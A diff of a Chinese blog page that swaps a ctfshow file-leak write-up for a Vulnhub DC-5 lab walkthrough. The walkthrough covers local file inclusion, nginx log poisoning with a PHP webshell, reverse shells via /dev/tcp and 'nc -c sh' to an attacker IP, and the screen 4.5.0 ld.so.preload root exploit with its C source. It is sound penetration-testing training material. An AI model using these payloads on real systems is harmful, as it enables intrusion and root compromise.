@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>ctfshow-web入门-信息收集 | PIP的空间</title>
+  <title>vulnhub-DC-5 | PIP的空间</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -464,21 +464,21 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://pic2.zhimg.com/80/v2-e22aaad20d20634f506f57fff0fcbc17_1440w.webp')">
+  background-position: center center;position: relative;background-image:url('https://pic3.zhimg.com/v2-a5267dfbf175991d4b3a69b41f3f678a_b.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        ctfshow-web入门-信息收集
+        vulnhub-DC-5
       </span>
     </div>
     
     
       
         <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> Published in：2023-01-27 |
+          <i class="fas fa-calendar"></i> Published in：2023-06-29 |
         </span>
       
 
@@ -488,10 +488,6 @@
           
             <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-detail-header_category">
               网络安全
-            </a>
-          
-            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ctf/" class="post-detail-header_category">
-              ctf
             </a>
           
         </span>
@@ -515,41 +511,135 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p>靶场&#x2F;来源: ctfshow</p>
-<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a><strong>web5</strong></h1><p><strong>题目：</strong></p>
-<p><img src="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image1.png" class="lazyload placeholder" data-srcset="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image1.png"></p>
-<p><strong>解题过程：</strong></p>
-<p>根据提示，这是一道phps源码泄露题，先用御剑扫描，但不知道为什么没扫到。</p>
-<p>百度一下phps源码泄露，发现泄漏点在xxx.phps，访问&#x2F;index.phps，得到源码。</p>
-<p><img src="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image2.png" class="lazyload placeholder" data-srcset="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image2.png"></p>
-<p>获得flag</p>
-<p><strong>知识点：（包括web入门所有题）</strong></p>
-<p>信息收集的一些文件泄露：</p>
-<blockquote>
-<p>1.robots.txt文件泄露，放在网站的根目录下，用于限制浏览器的访问（哪些可以抓取，哪些不能抓取）用于防止黑客，但是任何人可在url中直接通过&#x2F;robots.txt访问，导致网站结构被泄露。可对admin等重要文件设置密保保护，或者采取更换文件名的方法防御.</p>
-<p>2.phps文件泄露，phps存放着php源码,可通过尝试访问&#x2F;index.phps读取,或者尝试扫描工具扫描读取.</p>
-<p>3..git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git&#x2F;index文件可找到工程所有文件名和sha1文件,在git&#x2F;objects下载导致危害</p>
-<p>4.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制）</p>
-<p>5.vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn</p>
-<p>6.压缩文件也可能包含文件的源码等，注意rar zip后缀</p>
-<p>7.通过网站的技术文档什么的，可以知道默认后台路径及密码，比如document.pdf</p>
-<p>8.&#x2F;editor,在editor的flash模块，有一个文件空间，从这里可以看到服务器的目录，里面可能有flag</p>
-<p>9.php探针如：l.php,phpinfo.php,tz.php</p>
-<p>10.mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe。</p>
-</blockquote>
-<p>文件：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">index.phps</span><br><span class="line">.git</span><br><span class="line">.svn</span><br><span class="line">.index.php.swp</span><br><span class="line">.index.php.swo</span><br><span class="line">.index.php.swn</span><br><span class="line">./editor</span><br><span class="line">document.pdf</span><br><span class="line">l.php</span><br><span class="line">phpinfo.php</span><br><span class="line">tz.php</span><br><span class="line">/db/db.mdb</span><br></pre></td></tr></table></figure>
+        <h1 id="vulnhub-DC-5"><a href="#vulnhub-DC-5" class="headerlink" title="vulnhub-DC-5"></a>vulnhub-DC-5</h1><p>DC-5靶场下载地址：<a target="_blank" rel="noopener" href="https://www.five86.com/downloads/DC-5.zip">https://www.five86.com/downloads/DC-5.zip</a></p>
+<p>只需要下载，然后用VM打开，把网络配置改成net即可</p>
+<h1 id="第一步：发现主机"><a href="#第一步：发现主机" class="headerlink" title="第一步：发现主机"></a>第一步：发现主机</h1><h2 id="方式一：使用nmap进行网段扫描和端口扫描"><a href="#方式一：使用nmap进行网段扫描和端口扫描" class="headerlink" title="方式一：使用nmap进行网段扫描和端口扫描"></a>方式一：使用nmap进行网段扫描和端口扫描</h2><p>网段扫描，主机是否在线：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sP <span class="number">192.168</span>.<span class="number">220.0</span>/<span class="number">24</span> -oN nmap220.sP</span><br><span class="line"></span><br><span class="line">-T4：表示设置扫描速度为 <span class="number">4</span>，这是一个中等的速度选项。你也可以根据实际情况调整扫描速度，例如使用 -T1（最慢）到 -T5（最快）之间的选项。</span><br><span class="line">-sP：表示进行 Ping 扫描，即对指定 IP 地址范围内的主机进行 ICMP Ping 检测，以确定主机是否在线。</span><br><span class="line">-oN nmap220.sP：表示输出扫描结果到文件 nmap220.sP 中，格式为普通文本。</span><br></pre></td></tr></table></figure>
 
-<p>信息泄露点：</p>
-<p>1.可以通过网站泄露的qq，手机号码，wx等获得一些信息（地点等）</p>
+<p>端口扫描，发现运行的服务：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 <span class="number">192.168</span>.<span class="number">153.143</span> -p- -oN <span class="number">143</span>.A</span><br><span class="line"></span><br><span class="line">-A：表示使用其它高级选项进行主机探测，包括操作系统检测、版本检测、脚本扫描等。-A 选项可以提供更详细的信息。</span><br><span class="line">-p- 表示全端口扫描</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<h2 id="方式二：使用fscan"><a href="#方式二：使用fscan" class="headerlink" title="方式二：使用fscan"></a>方式二：使用fscan</h2><p>（没有扫全端口）</p>
+<p><img src="/Untitled-1.png" class="lazyload placeholder" data-srcset="/Untitled-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>综合考虑，经过排除，可以看到<code>192.168.153.143</code>就是我们的靶机了（我同时开了个centos）</p>
+<p>一共开放了三个端口</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">34574</span></span><br><span class="line"><span class="number">111</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>访问一下80端口</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-2.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>这里有一些输入框,随便输一些东西进去试试</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-3.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>提交后到达这个页面</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-4.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>然后接下来就是一个神奇的思路了（不看wp我真想不出来</p>
+<p>通过刷新此页面，可以看到下面<code>Copyright © 2018</code>一直在变，这里可以知道是文件包含（我也不知道为什么）</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-5.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-6.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-7.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>知道有文件包含之后，就得fuzz出参数了（这里就不fuzz，直接就是手动<code>file</code>了，用<code>arjun</code>也不太方便，因为页面内容一直变化，影响判断）</p>
+<p>包含一下<code>passwd</code></p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-8.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>读<code>shadow</code>发现读不到，判断是权限不够，不是root账号</p>
+<p>然后接下来就是读dc用户的<code>ssh</code>，<code>history</code>，发现都没有</p>
+<p>等等！这byd是个文件包含，不是任意文件读取，能做得事情更多</p>
+<p>我们先读取<code>nginx</code>配置文件：<code>/etc/nginx/nginx.conf</code></p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-9.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>小技巧，选择并右键查看源代码，这样更有可阅性，不会乱成一团</p>
+<p>然后查找nginx日志位置</p>
+<p>看到了</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-10.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-10.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>尝试在UA头发送一句话木马并包含</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-11.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-11.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>发送命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.153.143/thankyou.php?file=../../../../../../../../var/log/nginx/access.log&amp;1=ls</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-12.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-12.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>成功getshell</p>
+<p>但到这里不知道为什么webshell工具都突然发dian了，连接不上，又因为这个日志文件太大了，所以我想重新上个马，直接<code>touch</code>创建不了，因为权限不够</p>
+<p>所以了php来创建（请记住我写的这个sb代码，直接把日志文件给搞下线了（原因不明</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-13.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-13.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>当我以为靶机坏了的时候，我打开我的xhell准备关闭，但一看</p>
+<p>OHHHHH！</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-14.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-14.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>刚才反弹shell还剩个命令行（很难受的一个命令行窗口，不能任意操作）</p>
+<p>所以我准备利用这个命令行来创建一个新马，首先查看<code>id</code>，发现是<code>www-data</code>权限，在网站目录下创建文件夹失败</p>
+<p>我们可以先查看一下哪些文件夹普通用户有权限写入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l / <span class="comment">#看一下根目录</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-15.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-15.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>发现这个tmp目录权限挺高的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php eval(system(\$_POST[b]));?&gt;&quot;</span> &gt; /tmp/<span class="number">6</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p>直接创建一个文件</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-16.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-16.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>这样就重新连上了（但是webshell依然没搞定）</p>
+<p>然后又回到刚才那个难受的窗口，学到了个新技巧切换到shell外壳（可以接收交互式shell）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-17.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-17.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>补充一下那个难受的反弹shell，但没办法，因为发送请求时用<code>sh -i &gt;&amp; /dev/tcp/192.168.153.138/8888 0&gt;&amp;1</code>的话<code>&amp;</code>会被误以为请求参数的连接符</p>
+<p>所以使用了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -c sh <span class="number">192.168</span>.<span class="number">153.138</span> <span class="number">8888</span></span><br><span class="line"><span class="number">138</span>虚拟机开启监听：nc -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>权限太低了，很多操作都被限制了，提升一下权限。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">将可以提权的命令输出到/tmp/<span class="number">1</span>.txt</span><br><span class="line">find / -perm -<span class="number">4000</span> -o -perm -<span class="number">2000</span> &gt;&gt; /tmp/<span class="number">1</span>.txt</span><br><span class="line">或</span><br><span class="line">find / -user root -perm -<span class="number">4000</span> -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br><span class="line"></span><br><span class="line">find：表示执行 find 命令，用于在文件系统中搜索文件和目录。</span><br><span class="line">    /：表示要搜索的起始路径。在这种情况下，/ 表示从根目录开始搜索整个文件系统。</span><br><span class="line">    -user root：表示匹配所有者为 root 的文件。</span><br><span class="line">    -perm -<span class="number">4000</span>：表示匹配具有 setuid 权限（数字 <span class="number">4000</span>）的文件。加号 - 表示匹配精确的权限。</span><br><span class="line">    -<span class="keyword">print</span>：表示打印匹配到的文件路径。</span><br><span class="line"></span><br><span class="line">最后的 <span class="number">2</span>&gt;/dev/<span class="literal">null</span> 是将标准错误输出重定向到空设备，以防止错误消息显示在终端上。</span><br></pre></td></tr></table></figure>
+
+<p>查看</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-18.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-18.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>发现screen-4.5.0</p>
+<p>在kali上查找可用于screen 4.5.0的漏洞脚本文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen <span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-19.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-19.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>PS：<code>searchsploit</code> 是一款在exp仓库中搜索可用exp的工具</p>
+<p>查看一下exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/<span class="number">41154</span>.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-20.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-20.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<ol>
+<li>创建第一个文件，并复制一下代码块</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vi libhax.c</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>创建第二个文件，复制第二个代码块</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vi rootshell.c</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">main</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">seteuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">setegid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">execvp</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>编译文件</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-21.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-21.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-22.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-22.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>接下来就是把exp发送到靶机</p>
+<p>kali开启服务</p>
+<p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-23.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-23.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p>
+<p>切换到tmp目录并下载exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ wget <span class="number">192.168</span>.<span class="number">153.129</span>:<span class="number">9999</span>/libhax.so</span><br><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ wget <span class="number">192.168</span>.<span class="number">153.129</span>:<span class="number">9999</span>/rootshell</span><br></pre></td></tr></table></figure>
+
+<p>最后就是执行exp的最后一段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask <span class="number">000</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="keyword">echo</span> -ne <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span></span><br><span class="line">screen –ls</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>幻想时间：</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@dc-<span class="number">5</span>:id</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>现实：</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-<span class="number">5</span>:/tmp$ ./<span class="number">2</span>.sh</span><br><span class="line">./<span class="number">2</span>.sh</span><br><span class="line"><span class="string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span></span><br><span class="line"><span class="string">[+] done!</span></span><br><span class="line"><span class="string">Please set a terminal type.</span></span><br><span class="line"><span class="string">/tmp/rootshell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&#x27;</span> not <span class="title function_ invoke__">found</span> (required by /tmp/rootshell)</span><br></pre></td></tr></table></figure>
+<p>  6，没提权成功，没找到是什么问题，靠</p>
+</li>
+</ul>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/CTFwp/" class="">
-              CTFwp
+            <a href="/tags/vulnhub/" class="">
+              vulnhub
             </a>
           
         </div>
@@ -563,7 +653,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/" target="_blank" title="ctfshow-web入门-信息收集">http://example.com/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/</a>
+    <a href="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/" target="_blank" title="vulnhub-DC-5">http://example.com/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -581,45 +671,23 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2023/06/26/hello-world/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> Prev:
-        <div class="title-text">Hello World</div>
-      </div>
-      
-      <!-- <div class="content">
-        Welcome to Hexo! This is your very first post. Check documen
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
